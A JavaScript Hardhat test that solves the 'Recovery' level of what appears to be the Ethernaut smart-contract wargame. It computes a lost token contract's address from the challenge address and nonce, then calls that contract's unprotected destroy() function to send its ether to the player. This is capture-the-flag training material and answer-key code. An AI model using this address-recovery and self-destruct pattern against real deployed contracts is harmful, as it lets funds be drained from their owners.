const { expect } = require("chai");
const { createChallenge, submitLevel } = require("./utils");

async function getChallenge() {
  const factory = await ethers.getContractFactory("Recovery");
  const challengeAddress = await createChallenge(`0xAF98ab8F2e2B24F42C661ed023237f5B7acAB048`, ethers.parseEther("0.001"))
  const challenge = factory.attach(challengeAddress);
  return challenge;
}

it("Solves 17-Recovery", async function () {
  const challenge = await getChallenge();
  const challengeAddress = await challenge.getAddress();

  const tokenAddress = ethers.getCreateAddress({from: challengeAddress, nonce: 1});

  const factory = await ethers.getContractFactory("SimpleToken");
  const token = factory.attach(tokenAddress);

  const [eoa] = await ethers.getSigners();
  await token.destroy(await eoa.getAddress());

  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});
